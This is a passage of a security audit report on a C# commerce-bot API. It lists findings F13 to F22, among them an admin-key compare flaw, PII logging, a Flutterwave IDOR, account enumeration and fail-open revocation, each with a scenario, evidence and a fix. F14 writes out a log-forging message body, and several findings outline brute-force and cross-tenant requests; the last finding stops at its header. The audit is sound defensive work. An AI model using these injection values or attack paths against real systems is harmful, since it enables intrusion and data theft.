## F13 · [Medium] Admin-key hardening (OJ-04) not applied to /api/admin/onboarding-analytics: case-insensitive compare + no audit trail
- **Domain:** logging-privacy-crypto · **Verdict:** CONFIRMED · **New since audit #1:** True
- **CWE:** CWE-208 (Observable Timing/Comparison weakness) / CWE-778 (Insufficient Logging) / CWE-307 (Improper Restriction of Excessive Auth Attempts)
- **OWASP:** A07:2021 Identification and Authentication Failures
- **Component:** Ojunai.API/Controllers/AdminController.cs
- **Files:** Ojunai.API/Controllers/AdminController.cs

**Description:** The 2026-07 fix OJ-04 made the admin-key comparison case-SENSITIVE and routed all admin endpoints through the shared ValidateAdminKey()/ValidateAdminKeyInner() helper, which also writes an AdminAuditEntry on every hit (success or failure). GetOnboardingAnalytics is the ONE admin endpoint that never adopted that fix. It performs its own inline comparison that lowercases BOTH sides — the exact weakness the fix eliminated elsewhere (see the comment at AdminController.cs:134-135: 'The previous lowercasing of both sides roughly halved the effective entropy of the admin key'). It also does NOT call ValidateAdminKey, so it writes no AdminAuditEntry. The operations checklist (security-audit/SECURITY_OPERATIONS_CHECKLIST.md:41) relies on 'repeated admin-key auth failures (AdminAuditEntry failures-by-IP)' for brute-force alerting — attempts against this endpoint are invisible to that control. The endpoint also returns onboarding PII (RawMessage of onboarding messages, owner names, business names, cities) on success.

**Attack scenario:** An attacker brute-forces Admin:AnalyticsKey against GET /api/admin/onboarding-analytics?key=<guess>. The case-insensitive compare (lines 27-28 both call .ToLowerInvariant()) shrinks the effective alphabet (e.g. mixed-case alnum from 62 to 36 symbols/char), and because this path emits no AdminAuditEntry, the failures-by-IP alerting never fires. On a hit the attacker exfiltrates onboarding PII and, more importantly, now holds the global admin key usable against the destructive wipe endpoints.

**Preconditions:** Endpoint is reachable ([AllowAnonymous] on the controller, route api/admin/onboarding-analytics). Attacker attempts to guess the Admin:AnalyticsKey.

**Impact:** Reduced admin-key entropy plus a blind spot in brute-force detection for a key that authorizes tenant-data wipes (wipe-all-data / wipe-inventory-expenses) and full billing/telemetry access; leak of onboarding PII.

**Evidence:** AdminController.cs:22-28 — GetOnboardingAnalytics validates inline with CryptographicOperations.FixedTimeEquals over UTF8.GetBytes((key ?? "").ToLowerInvariant()) vs secret.ToLowerInvariant(); no call to ValidateAdminKey/WriteAuditEntry. Contrast AdminController.cs:136-138 (ValidateAdminKeyInner) which compares key vs secret verbatim (case-sensitive), and AdminController.cs:121 which always writes an audit entry. All other endpoints (e.g. :185, :235, :400, :471) call ValidateAdminKey(key). Fix intent documented in security-audit/SECURITY_FINDINGS.md:49-52.

**Recommended fix:** Replace the inline check in GetOnboardingAnalytics with a call to the shared ValidateAdminKey(key) so it (a) compares case-sensitively and (b) writes an AdminAuditEntry. Remove the .ToLowerInvariant() calls at lines 27-28.

**Verification:** Verified directly in AdminController.cs. Lines 26-28: GetOnboardingAnalytics performs its own inline auth check that calls .ToLowerInvariant() on BOTH (key ?? "") and secret before CryptographicOperations.FixedTimeEquals — the exact case-insensitive weakness that OJ-04 removed elsewhere (documented in the comment at lines 134-135). It also does NOT call ValidateAdminKey, so it writes no AdminAuditEntry; every other admin endpoint (lines 185, 235, 282, 341, 400, 433, 471, 562, 597, 641, 681, 732, 782, 832, 889, 949, 995, 1050, 1123) routes through ValidateAdminKey(key), which is case-sensitive (lines 136-138) and always writes an audit row (line 121). The endpoint returns onboarding PII: RawMessage (line 34), OwnerName/BusinessName/City (lines 58-68, 88-98). All core claims are accurate. The audit-trail gap is genuine — attempts against this path are invisible to the failures-by-IP brute-force alerting the operations checklist relies on — and this key also authorizes destructive wipe endpoints, so the inconsistency matters.

---

## F14 · [Medium] Customer phone number and full message body logged unredacted at Information level (PII leak + log injection)
- **Domain:** logging-privacy-crypto · **Verdict:** CONFIRMED · **New since audit #1:** True
- **CWE:** CWE-532 (Insertion of Sensitive Information into Log File) / CWE-117 (Improper Output Neutralization for Logs)
- **OWASP:** A09:2021 Security Logging and Monitoring Failures
- **Component:** Ojunai.API/Controllers/WebhooksController.cs
- **Files:** Ojunai.API/Controllers/WebhooksController.cs

**Description:** Both the legacy and V1 inbound WhatsApp paths log the sender's full phone number AND the full untrusted message body at Information level. Message bodies for this commerce bot routinely contain customer names, sale amounts, debts and other financial PII, and the phone number is the customer's MSISDN. The rest of the codebase deliberately redacts phone numbers before logging (WhatsAppService.RedactPhone at :3482 used at :317; PhoneVerificationService.Redact at :142 used at :98/:102; AdminController.RedactPhone at :103), so this is an inconsistent, unredacted PII sink. Additionally the body is attacker-controlled and logged raw: the default console/journald formatter renders template arguments inline, so a body containing newline + fabricated timestamp/level text forges extra log lines — the very injection that RequestContextMiddleware.cs:25-26 sanitizes X-Request-Id against, but which is not applied to the message body here.

**Attack scenario:** Any customer sends a WhatsApp message; their MSISDN and message content land in plaintext in journald (retained per journald config, readable by any host operator). To forge log entries an attacker sends a message body like 'buy 1 item\n2026-07-13 00:00:00 [ERROR] Ojunai.API auth bypass for admin' which appears as a separate ERROR log line after inline substitution.

**Preconditions:** Inbound WhatsApp webhook traffic (normal operation). Reader of host/journald logs sees the entries.

**Impact:** Customer PII (phone + message content, incl. financial data) exposed to anyone with log/journald access and to any downstream log shipper; log-integrity/forgery via injected newlines.

**Evidence:** WebhooksController.cs:67 — _logger.LogInformation("Inbound WhatsApp from {From}: {Body}", form.From, form.Body); WebhooksController.cs:107 — _logger.LogInformation("Inbound WhatsApp (V1) from {From}: {Body}", message.SenderIdentity, message.Text); Compare redaction helpers at Services/WhatsAppService.cs:3482, Services/PhoneVerificationService.cs:142, Controllers/AdminController.cs:103, and the id-sanitization at Common/RequestContextMiddleware.cs:26.

**Recommended fix:** Redact the phone (reuse RedactPhone) and either drop the body from the log line or log a fixed-length, newline-stripped preview only at Debug. Strip CR/LF from any user-supplied value before logging.

**Verification:** All load-bearing claims verified in source. (1) WebhooksController.cs:67 and :107 both log the full sender phone (form.From / message.SenderIdentity, a full WhatsApp MSISDN like "whatsapp:+234...") and the full untrusted message body at Information level; TwilioInboundForm.Body (:379) is an unsanitized string with no CR/LF stripping before the log call. (2) The inconsistency claim holds — the codebase deliberately redacts phones before logging in three verified places: WhatsAppService.RedactPhone (:3482, used at :317), PhoneVerificationService.Redact (:142), AdminController.RedactPhone (:103); these two webhook sinks are the outliers. (3) The log-injection claim survives the key skeptical test: Program.cs:89-90 configures SimpleConsoleFormatterOptions (the inline SimpleConsoleFormatter), NOT AddJsonConsole, so a body containing a newline renders as forged separate log lines in journald — exactly the injection RequestContextMiddleware.cs:26 sanitizes X-Request-Id against but which is never applied to the message body. (4) Preconditions are realistic: the Twilio signature check proves origin via Twilio but does not sanitize body content, and any WhatsApp sender controls the body verbatim (WhatsApp permits newlines); normal customer traffic is itself the PII source, and this is a commerce bot whose message bodies routinely carry customer names, amounts, and debts. No guard or blocker refutes the finding.

---

## F15 · [Medium] Flutterwave pack verification path lets an authenticated tenant claim another tenant's transaction (incomplete IDOR fix)
- **Domain:** payments-webhooks · **Verdict:** CONFIRMED · **New since audit #1:** True
- **CWE:** CWE-639: Authorization Bypass Through User-Controlled Key
- **OWASP:** A01:2021 Broken Access Control
- **Component:** Payments — Flutterwave inline verify
- **Files:** Ojunai.API/Services/FlutterwaveService.cs, Ojunai.API/Controllers/SubscriptionController.cs

**Description:** The prior audit added a cross-tenant guard to VerifyAndActivateAsync: for tier-plan tx_refs it parses the embedded businessId (parts[1]) and rejects when it does not equal the authenticated caller (FlutterwaveService.cs:248-253). That same guard is MISSING on the WhatsApp-pack branch, which is evaluated earlier and returns before the tier check. At FlutterwaveService.cs:226-230 any tx_ref starting with 'ojunai-pack-' is routed to HandleWhatsAppPackVerifiedAsync(businessId=caller, ...). Inside that method (FlutterwaveService.cs:947-1024) the tx_ref is split and validated only for structure and pack code (parts.Length==5, parts[0]=='ojunai', parts[1]=='pack', WhatsAppPackCodes.Contains(parts[2])) — parts[3], the businessId that initiated the checkout, is never compared to the caller. The method then activates the pack (BusinessAddOn) on the CALLER's business using the victim's paid amount, and its SaveChanges (FlutterwaveService.cs:1018) commits the PaystackEventLog(verifiedTxRef) idempotency row that was tracked at FlutterwaveService.cs:220 — so it also consumes the victim's single-use tx_ref, meaning the victim's own later verify no-ops (returns null at :218) and the paying victim never receives the pack they bought.

**Attack scenario:** POST /api/subscription/verify-flutterwave with {"TransactionId":"<victim's sequential flw id>"} (or the victim's pack tx_ref). The v3 verify API, called with the shared merchant secret key, returns any transaction under the merchant account. Because status is 'successful' and tx_ref begins 'ojunai-pack-', the caller gets the pack activated on their own account for a charge someone else paid, and the victim is denied their pack.

**Preconditions:** Attacker holds ManageSettings on any tenant (their own account). They must reference a victim's Flutterwave transaction id (v3 transaction ids are sequential integers, so enumerable) or tx_ref for a successful WhatsApp-pack charge whose tx_ref has not yet been recorded in PaystackEventLogs (e.g. the victim paid but their browser never fired the follow-up verify — closed tab — or the attacker wins the race before the victim's verify call). The pack/currency must match the attacker's configured billing currency.

**Impact:** Free paid add-on for the attacker plus denial-of-entitlement to the legitimate payer (griefing). Bounded to WhatsApp-pack price, but repeatable across enumerated victim transactions.

**Evidence:** FlutterwaveService.cs:226-230 routes pack tx_refs before the tier-only businessId check at :248-253; HandleWhatsAppPackVerifiedAsync (FlutterwaveService.cs:947-973) validates only structure+packCode and uses the caller's businessId with no ownership check; idempotency row committed at :1018 consumes the victim's tx_ref.

**Recommended fix:** In HandleWhatsAppPackVerifiedAsync, parse the embedded businessId (parts[3]) and reject when it does not equal the authenticated caller — mirroring the tier-path guard at FlutterwaveService.cs:248-253. Alternatively, perform the businessId==caller check once, up front in VerifyAndActivateAsync, before dispatching to either the pack or tier branch.

**Verification:** Verified the full chain against the source. verify-flutterwave (SubscriptionController.cs:477-484) requires only ManageSettings, which any tenant holds on their own account, and passes the caller's BusinessId plus attacker-controlled TransactionId/TxRef into VerifyAndActivateAsync. The verify call (FlutterwaveService.cs:163-174) uses the shared merchant secret key against /v3/transactions/{id}/verify and verify_by_reference, so it returns any transaction under the merchant account — a victim's transaction is reachable, and v3 ids are enumerable. The idempotency logic (:214-220) is tenant-agnostic and stages a PaystackEventLog row for the victim's tx_ref. Pack tx_refs are dispatched to HandleWhatsAppPackVerifiedAsync at :226-230 BEFORE the tier businessId guard at :248-253 and return early. The pack handler (:947-1024) validates only parts.Length==5, parts[0]=="ojunai", parts[1]=="pack", and WhatsAppPackCodes.Contains(parts[2]); it never parses or compares parts[3], which the generator at :939 fills with the initiating businessId. Pack codes (start, grow, pro, scale, unlimited) contain no hyphens, so the 5-part split is stable and parts[3] is reliably the businessId. The BusinessAddOn (:995) and BillingEvent (:1008) are written under the caller's businessId, and SaveChanges (:1018) commits the idempotency row consuming the victim's single-use tx_ref, causing the victim's own later verify to no-op at :218. The tier path guard at :248-253 is the exact check missing from the pack path — a genuine incomplete-fix IDOR (CWE-639). Preconditions (victim tx_ref not yet recorded — closed tab or race — and paid amount within 1 of the attacker's configured pack price/currency) are constraining but realistic. Medium is the correct severity: cross-tenant free add-on plus denial-of-entitlement griefing, bounded to pack price, repeatable across enumerated transactions.

---

## F16 · [Low] request-reset / verify-reset leak account existence AND staff role, defeating the controller's generic anti-enumeration response
- **Domain:** auth-session · **Verdict:** CONFIRMED · **New since audit #1:** True
- **CWE:** CWE-204
- **OWASP:** A07:2021 Identification and Authentication Failures
- **Component:** Authentication - password reset
- **Files:** /Users/kendennis/Desktop/Ojunai-AI/Ojunai.API/Services/AuthService.cs, /Users/kendennis/Desktop/Ojunai-AI/Ojunai.API/Controllers/AuthController.cs, /Users/kendennis/Desktop/Ojunai-AI/Ojunai.API/Program.cs

**Description:** AuthController.RequestReset (AuthController.cs:242-250) intentionally returns a generic 'If that number is registered...' message to avoid enumeration. But AuthService.RequestPasswordResetAsync throws InvalidOperationException for registered Sales/Bookkeeper/Viewer accounts ('Staff accounts can't self-reset by WhatsApp...', AuthService.cs:254-256), and VerifyResetAndChangePasswordAsync throws KeyNotFoundException 'No account found.' for unknown phones (AuthService.cs:268-269). The global exception handler (Program.cs:347-356) serializes error.Error.Message verbatim to the client, so these thrown messages reach the caller and override the controller's generic response.

**Attack scenario:** Attacker POSTs /api/auth/request-reset with candidate phone numbers: an Owner/Admin returns 200 generic; a staff account returns 400 'Staff accounts can't self-reset by WhatsApp...'; an unregistered number returns 200 generic. This confirms both existence and that the account is a lower-privilege staff role. /api/auth/verify-reset returns 400 'No account found.' for unregistered numbers, a second existence oracle.

**Preconditions:** Unauthenticated; subject to per-IP AuthRateLimit (10/5min).

**Impact:** Account and role enumeration despite the deliberate anti-enumeration message — a worse variant than plain existence enumeration because it discloses which numbers are staff (targeting for social engineering / owner-reset requests).

**Evidence:** AuthService.cs:254-256 (role throw) and AuthService.cs:268-269 (KeyNotFound); Program.cs:352-355 maps InvalidOperationException/KeyNotFoundException to 400 with error.Error.Message; AuthController.cs:248-249 returns generic only on the success path.

**Recommended fix:** In RequestPasswordResetAsync, treat the staff-role and unknown-number cases as silent no-ops (return like the unknown-number branch) so the controller's generic response is always what the client sees; in VerifyResetAndChangePasswordAsync return a generic invalid-code style message rather than 'No account found.'

**Verification:** Verified all three cited locations. AuthService.RequestPasswordResetAsync (AuthService.cs:243-263) silently no-ops on unknown numbers but THROWS InvalidOperationException with the message 'Staff accounts can't self-reset by WhatsApp...' for registered Sales/Bookkeeper/Viewer accounts (line 254-256), while Owner/Admin and unknown numbers both yield the controller's 200 generic response. VerifyResetAndChangePasswordAsync (AuthService.cs:265-273) throws KeyNotFoundException('No account found.') for unknown numbers and the staff-role InvalidOperationException for staff, producing three distinguishable outcomes (unknown / staff / owner-admin). The global exception handler in Program.cs:352-355 maps InvalidOperationException/KeyNotFoundException/ArgumentException to HTTP 400 and serializes error.Error.Message verbatim via ApiResponse.Fail. The controller methods (AuthController.cs:248-249, 257-258) await without try/catch, so these thrown messages reach the client and override the intended generic 'If that number is registered...' message. This is a genuine account+role enumeration oracle: request-reset confirms a number is a registered staff account, and verify-reset gives a full existence oracle for any registered number plus role disclosure. The code's own doc comment (AuthService.cs:238-241) explicitly acknowledges the enumeration trade-off, corroborating intent-vs-behavior mismatch. Preconditions match: unauthenticated, rate-limited per IP (AuthRateLimit), which slows but does not prevent targeted enumeration. No missing guard refutes the claim.

---

## F17 · [Low] TokenVersion session-revocation check fails open when the tokenVersion claim is missing or unparseable
- **Domain:** auth-session · **Verdict:** CONFIRMED · **New since audit #1:** True
- **CWE:** CWE-636
- **OWASP:** A07:2021 Identification and Authentication Failures
- **Component:** Authentication - session revocation
- **Files:** /Users/kendennis/Desktop/Ojunai-AI/Ojunai.API/Common/ActiveUserMiddleware.cs

**Description:** The session-revocation check is guarded by int.TryParse of the token's tokenVersion claim: 'if (int.TryParse(tokenVersionClaim, out var tokenVersion) && tokenVersion != user.TokenVersion)' (ActiveUserMiddleware.cs:81-82). If the claim is absent or non-numeric, TryParse returns false and the entire revocation branch is skipped — the request is treated as valid regardless of the user's current TokenVersion. Revocation (password change/reset/recovery) relies entirely on this check, so a validly-signed token without the claim would never be invalidated.

**Attack scenario:** Any validly-signed token that carries sub + businessId but omits/garbles tokenVersion would survive a password change/reset. Not reachable with currently-minted tokens (GenerateJwt always adds tokenVersion, AuthService.cs:697), so this is a latent fail-open rather than an exploitable path today — it becomes exploitable if any future token-minting path forgets the claim or if the signing key is compromised.

**Preconditions:** Requires a signed token lacking the tokenVersion claim; none are currently issued, so not exploitable in the present build.

**Impact:** Defense-in-depth gap: the primary session-invalidation mechanism silently no-ops instead of denying when the claim is not present.

**Evidence:** ActiveUserMiddleware.cs:81-99 — missing/unparseable claim short-circuits the '!=' comparison; contrast with lines 59-76 where user-inactive and businessId-mismatch fail closed.

**Recommended fix:** Fail closed: if the authenticated principal lacks a parseable tokenVersion claim, reject with 401 (mirror the businessId-mismatch handling) rather than allowing the request.

**Verification:** Code matches the report exactly. ActiveUserMiddleware.cs:82 uses `int.TryParse(tokenVersionClaim, out var tokenVersion) && tokenVersion != user.TokenVersion`; when the tokenVersion claim is missing or non-numeric, TryParse returns false, the && short-circuits, and the revocation branch is skipped — the request is allowed regardless of User.TokenVersion. This is a real fail-open and stands in explicit contrast to the businessId check at line 70, which fails closed (missing claim yields null and is rejected). I confirmed AuthService.GenerateJwt (AuthService.cs:697) unconditionally adds the tokenVersion claim, so no legitimately-minted token triggers the fail-open — consistent with the finder's own statement that this is latent/non-exploitable in the present build. Reaching the gap requires a validly-signed token that omits the claim, i.e. signing-key compromise. The one genuine defense-in-depth loss: TokenVersion-based revocation is the single control that could re-lock a key-holder after a password reset (they can re-mint tokens but need not know the current TokenVersion), and omitting the claim neuters precisely that control. Real but narrow; Low severity is appropriate. The recommended fix (reject 401 when no parseable tokenVersion claim, mirroring the businessId handling) is correct.

---

## F18 · [Low] Account-recovery and email-verification token validation only scans the 50 newest tokens globally (fails closed under concurrency)
- **Domain:** auth-session · **Verdict:** CONFIRMED · **New since audit #1:** True
- **CWE:** CWE-400
- **OWASP:** A04:2021 Insecure Design
- **Component:** Authentication - recovery/verification tokens
- **Files:** /Users/kendennis/Desktop/Ojunai-AI/Ojunai.API/Services/AccountRecoveryService.cs, /Users/kendennis/Desktop/Ojunai-AI/Ojunai.API/Services/EmailVerificationService.cs

**Description:** Because tokens are BCrypt-hashed (per-salt, not lookupable by equality), both services validate by pulling candidate rows and BCrypt-verifying each. The candidate query is bounded by .Take(50) over ALL users' unused/unexpired tokens ordered by CreatedAtUtc (AccountRecoveryService.cs:276-281; EmailVerificationService.cs:131-136). If more than 50 unused, unexpired recovery (or verification) tokens exist system-wide within the 30-min/24-hour window, a legitimate token that is not among the 50 newest will not be found and validation throws 'invalid or expired'.

**Attack scenario:** Not a confidentiality break (it fails closed). A burst of concurrent recovery/verification issuance — organic at the platform's stated 100x scale, or nudged by an actor generating tokens — can push a real user's valid token out of the top-50 window, denying them account recovery or email verification.

**Preconditions:** >50 unused, unexpired tokens of the same type present concurrently.

**Impact:** Availability of the recovery/verification flows degrades under concurrency; a valid recovery link can intermittently be rejected.

**Evidence:** AccountRecoveryService.cs:280 '.Take(50)' with no per-user WHERE on the token owner; EmailVerificationService.cs:135 same pattern. Both order by CreatedAtUtc desc across the whole table.

**Recommended fix:** Add an indexed non-secret selector (e.g., a short random token prefix or a UserId lookup step, or store a fast keyed hash such as HMAC-SHA256 of the token alongside the BCrypt hash) so the candidate set is scoped to a single user instead of a global Take(50).

**Verification:** Code matches the finding exactly. ResolveActiveTokenAsync (AccountRecoveryService.cs:276-281) and ConsumeTokenAsync (EmailVerificationService.cs:131-136) both query unused/unexpired tokens across ALL users, order by CreatedAtUtc descending, and .Take(50), then BCrypt-verify each candidate. There is no per-user WHERE and no indexed non-secret selector, so validation only ever considers the 50 newest tokens system-wide. I checked for mitigating guards: the only rate limits present are per-user (recovery: 5-min cooldown + 3/day; verification: 60s cooldown + 5/hour) and thus do NOT cap the global pending-token pool, so they cannot prevent the pool from exceeding 50. The flow fails closed (finder correctly states this is not a confidentiality/takeover break). The precondition (>50 concurrent unused, unexpired tokens of one type) is realistic for email verification given its 24-hour lifetime, issuance on every signup/email-change, and users not clicking immediately — at the codebase's documented 100x scale this is easily reached, pushing a legitimate earlier token out of the newest-50 set and yielding a false 'invalid or expired' rejection. Account-recovery is more constrained (30-min window, rare flow, issuance gated on a real verified email) but shares the same structural defect. No cleanup job refutes it since the affected tokens are unexpired. This is a genuine availability/correctness design flaw.

---

## F19 · [Low] SalesService.CreateAsync accepts an unvalidated ContactId, allowing a sale/ledger entry to reference another tenant's contact and leaking that contact's name
- **Domain:** authz-tenant · **Verdict:** CONFIRMED · **New since audit #1:** True
- **CWE:** CWE-639 (Authorization Bypass Through User-Controlled Key)
- **OWASP:** A01:2021 Broken Access Control
- **Component:** SalesService — sale creation
- **Files:** Ojunai.API/Services/SalesService.cs

**Description:** TryCreateSaleAsync sets sale.ContactId = request.ContactId (SalesService.cs:135) directly from the request without verifying the contact belongs to the caller's business. Every other contact-consuming path validates ownership — LedgerService calls EnsureContactExistsAsync (LedgerService.cs:18/39/60), which the sale path omits. Because there is no ambient BusinessId query filter (AppDbContext only filters IsDeleted), GetByIdAsync's .Include(s => s.Contact) (SalesService.cs:526) will load a contact from ANY business, so the returned SaleDto.CustomerName reflects a foreign tenant's contact name. For credit sales an auto-receivable LedgerEntry is also created referencing the foreign ContactId (SalesService.cs:219-231).

**Attack scenario:** Attacker in business A submits POST /api/sales with a valid CreateSaleRequest and ContactId set to a contact GUID belonging to business B (e.g. obtained from a prior GDPR export, shared spreadsheet, or ex-employee). On the CreatedAtAction/GetById response, sale.Contact.Name resolves to business B's customer name, disclosing it. The sale and any receivable persist in business A referencing B's contact.

**Preconditions:** Attacker must know a specific contact GUID from another tenant (v4 GUIDs are not enumerable), limiting practical exploitability to cases where an ID has leaked.

**Impact:** Confirmation and disclosure of a single foreign contact's name per known GUID, plus orphaned/foreign-referencing ledger and sale rows inside the attacker's own tenant (data-integrity pollution). Victim tenant's own data views are unaffected.

**Evidence:** SalesService.cs:135 `ContactId = request.ContactId,` with no preceding ownership check; compare LedgerService.EnsureContactExistsAsync (LedgerService.cs:287-291) which enforces c.BusinessId == businessId. AppDbContext.cs has HasQueryFilter only on IsDeleted (lines 229/252/268), so Contact navigation loads cross-tenant.

**Recommended fix:** In TryCreateSaleAsync, when request.ContactId has a value, verify `await _db.Contacts.AnyAsync(c => c.Id == request.ContactId && c.BusinessId == businessId)` and throw KeyNotFoundException otherwise — mirroring LedgerService.EnsureContactExistsAsync.

**Verification:** Every load-bearing claim is verified in the code:

1. SalesService.cs:135 — TryCreateSaleAsync sets `ContactId = request.ContactId` directly from the request body with no preceding ownership/existence check. Confirmed.

2. No validation elsewhere — There is no FluentValidation in the project (grep for AbstractValidator returns nothing), and SalesController.Create (line 44-47) passes the request straight to CreateAsync with only a RequirePermission(RecordSales) attribute; BusinessId is derived from auth context but ContactId is fully attacker-controlled. CreateSaleRequest.ContactId is a nullable Guid (SaleDtos.cs:9). No ownership check exists on any sale path.

3. Asymmetry with LedgerService is real — LedgerService.CreateReceivable/Payable/RecordPayment all call EnsureContactExistsAsync (lines 18/39/60), which enforces `c.Id == contactId && c.BusinessId == businessId` (lines 287-291) and throws KeyNotFoundException otherwise. The sale path omits this guard entirely.

4. No ambient BusinessId query filter — AppDbContext has HasQueryFilter only for IsDeleted on Sale (229), SaleItem (252), Expense (268). Critically, the Contact entity (lines 275-287) has NO query filter at all — not even BusinessId. So GetByIdAsync's `.Include(s => s.Contact)` (line 526) resolves the Contact navigation purely by the ContactId FK with no tenant scoping. The sale itself is scoped (`s.BusinessId == businessId`, line 528), so the sale is created in the attacker's tenant, but the joined Contact is loaded cross-tenant. SaleDto.CustomerName = sale.Contact?.Name (line 564) therefore reflects the foreign tenant's contact name. Confirmed leak.

5. Credit-sale auto-receivable — For non-Paid sales with a ContactId (lines 215-231), a LedgerEntry with BusinessId = attacker's business but ContactId = foreign contact is persisted, creating cross-tenant-referencing rows in the attacker's own tenant. Confirmed.

The attack path (POST /api/sales with a foreign ContactId, then read CreatedAtAction/GetById response) works exactly as described. The precondition is accurately stated: the attacker must already know a specific v4 contact GUID from another tenant, which is not enumerable — so practical exploitability requires a leaked ID. Impact is confirmation/disclosure of a single foreign contact's name per known GUID plus data-integrity pollution within the attacker's own tenant; the victim tenant's own views are unaffected. Low severity is appropriate for the limited disclosure and gated precondition. The recommended fix (mirror EnsureContactExistsAsync in TryCreateSaleAsync when ContactId has a value) is correct and matches the established pattern.

---

## F20 · [Low] Admin onboarding-analytics endpoint still uses the case-insensitive admin-key comparison the audit fixed everywhere else (incomplete fix) and skips audit logging
- **Domain:** authz-tenant · **Verdict:** CONFIRMED · **New since audit #1:** True
- **CWE:** CWE-178 (Improper Handling of Case Sensitivity)
- **OWASP:** A07:2021 Identification and Authentication Failures
- **Component:** AdminController — onboarding-analytics
- **Files:** Ojunai.API/Controllers/AdminController.cs

**Description:** The prior audit fixed the admin-key comparison to be case-SENSITIVE in the shared ValidateAdminKeyInner helper (AdminController.cs:134-138, with an explicit comment about the previous lowercasing halving key entropy). GetOnboardingAnalytics was not migrated to that helper: it still lowercases BOTH the supplied key and the secret before FixedTimeEquals (AdminController.cs:26-28: `GetBytes((key ?? "").ToLowerInvariant())` vs `GetBytes(secret.ToLowerInvariant())`). This is the exact pattern the fix removed, so the fix is incomplete for this endpoint. Because it bypasses ValidateAdminKey, it also writes no AdminAuditEntry, unlike every other admin endpoint.

**Attack scenario:** Not a full auth bypass — the ~32+ char secret retains ample entropy even halved. The concrete defects are: (1) case-insensitive matching accepts key variants the case-sensitive endpoints reject, weakening the key and creating inconsistent behavior; (2) accesses to this PII-bearing endpoint are invisible in the admin audit log, so brute-force / probing here is not surfaced by the audit-log's failuresByIp view.

**Preconditions:** Requires knowledge of the admin key (or a near-miss casing variant of it). This is a defense-in-depth / fix-consistency issue, not an unauthenticated exposure.

**Impact:** Weakened and inconsistent admin authentication on a PII-exposing analytics endpoint, with no audit trail of access.

**Evidence:** AdminController.cs:22-28 GetOnboardingAnalytics inline check lowercases both sides; grep confirms lines 27-28 are the only remaining ToLowerInvariant() key comparison. It never calls ValidateAdminKey (AdminController.cs:115-123) which is what writes the audit row. The endpoint returns owner full names, business names, cities, and last-4 phone numbers (activeFlows/recentSignups, lines 43-98).

**Recommended fix:** Replace the inline check in GetOnboardingAnalytics with a call to ValidateAdminKey(key) so it uses the case-sensitive comparison and writes an audit entry, matching every other admin endpoint.

**Verification:** All cited claims verified in AdminController.cs. GetOnboardingAnalytics (lines 22-28) does an inline case-INSENSITIVE FixedTimeEquals — GetBytes((key ?? "").ToLowerInvariant()) vs GetBytes(secret.ToLowerInvariant()) — while the audit-fixed shared helper ValidateAdminKeyInner (lines 136-138) is case-SENSITIVE and carries an explicit comment that the previous lowercasing halved key entropy. grep confirms lines 27-28 are the only surviving ToLowerInvariant() key comparison (line 155 is the SHA-256 hex prefix; 540/1035 unrelated). The endpoint does not call ValidateAdminKey, so WriteAuditEntry never fires for it — unlike every other admin endpoint — meaning accesses/probes here leave no AdminAuditEntry. The endpoint returns PII (OwnerName, BusinessName, City) with phone redacted to last-4. This is a real, correctly-scoped incomplete-fix/consistency and audit-gap defect. It is not a full bypass: the key is 32+ chars so entropy remains ample even case-folded, and access still requires knowledge of the key (or a casing variant), so it is defense-in-depth, not unauthenticated exposure. Low severity is accurate.

---

## F21 · [Low] Flutterwave voice_ai activation never validates the paid amount against the tier price
- **Domain:** fix-regression · **Verdict:** CONFIRMED · **New since audit #1:** False
- **CWE:** CWE-840: Business Logic Errors
- **OWASP:** A04:2021 Insecure Design
- **Component:** FlutterwaveService webhook — voice_ai add-on branch
- **Files:** Ojunai.API/Services/FlutterwaveService.cs

**Description:** The new server-side verification (VerifyChargeWithApiAsync) now confirms transaction STATUS and exposes an authoritative verified.Amount, and the subscription/plan branch was updated to use it for a fail-closed amount check (FlutterwaveService.cs:760-799). The voice_ai add-on branch (FlutterwaveService.cs:672-726) was not: it reads vaChargeAmt = data.amount from the webhook payload only for the BillingEvent record (line 688, 713) and activates VoiceAIEnabled/tier/subscription-end (lines 697-705) without ever comparing the paid amount to the expected tier price. Pre-existing, but the fix made an authoritative amount check trivially available (verified.Amount) and applied it to the plan branch while leaving voice_ai unguarded.

**Attack scenario:** A caller who can drive a genuine but underpaid voice_ai charge (or whose meta.tier resolves to a more expensive tier than what was paid) gets the tier activated regardless of amount, since no amount comparison occurs in the voice_ai path.

**Preconditions:** Attacker can initiate a real Flutterwave voice_ai charge for less than the tier price, or influence meta.tier to a higher tier than paid.

**Impact:** Activation of a paid Voice AI tier without paying the correct amount (revenue leakage); bounded because status is now server-verified and meta.tier defaults to the existing tier when unset.

**Evidence:** FlutterwaveService.cs:688 `var vaChargeAmt = data.TryGetProperty("amount", ...)` used only at line 713 in the BillingEvent; lines 697-705 activate the tier with no price comparison; contrast the plan branch fail-closed check at FlutterwaveService.cs:799 using IsPaidAmountAcceptable(expectedCharge, chargeAmount, 0.5m).

**Recommended fix:** In the voice_ai branch, compute the expected price for vaTier/billingCycle/currency and gate activation on IsPaidAmountAcceptable(expected, verified.Amount, tolerance), failing closed as the plan branch does; use verified.Amount/verified.Currency rather than the payload amount.

**Verification:** Every load-bearing claim verified against source. FlutterwaveService.cs voice_ai branch (lines 672-726) activates VoiceAIEnabled/VoiceAITier/VoiceAISubscriptionEndsAt (lines 697-705) with no comparison of paid amount to expected tier price; vaChargeAmt=data.amount (line 688) is used only for the BillingEvent record (line 713). The plan branch (lines 760-799) does perform the missing check: expectedCharge via BillingConfig.GetPrice, fail-closed IsPaidAmountAcceptable(expectedCharge, verified.Amount, 0.5m) at line 780, recording payment.rejected on mismatch. The authoritative verified.Amount/verified.Currency from VerifyChargeWithApiAsync (line 647) is present and already consumed by the plan branch (lines 762,765), and a voice-tier price oracle exists (BillingConfig.GetVoiceAITierPrice, BillingConfig.cs:256) — so the recommended gate is trivially available yet absent. Exploitability is realistic: SubscriptionController voice-ai/initialize (lines 562-627) returns inlineCheckout=true with amount and meta={product:voice_ai,tier} to the browser; in Flutterwave inline checkout amount and meta are client-supplied at pay time, so an authenticated business owner (RequirePermission ManageSettings) can pay the cheaper starter price (NGN 39,999 vs pro 82,000) — or an arbitrarily small successful amount — while setting meta.tier=pro, and the webhook activates the higher tier because it only re-verifies transaction STATUS, never amount. meta.tier defaults to the existing tier when unset, so a legitimate flow is unaffected, bounding this to intentional underpayment. No unstated blocker; the guard the finder says is missing is genuinely absent.

---

## F22 · [Low] Incomplete fix: onboarding-analytics admin endpoint retains case-insensitive key compare and bypasses the admin audit log
- **Domain:** infra-cicd-secrets-deps · **Verdict:** CONFIRMED · **New since audit #1:** True
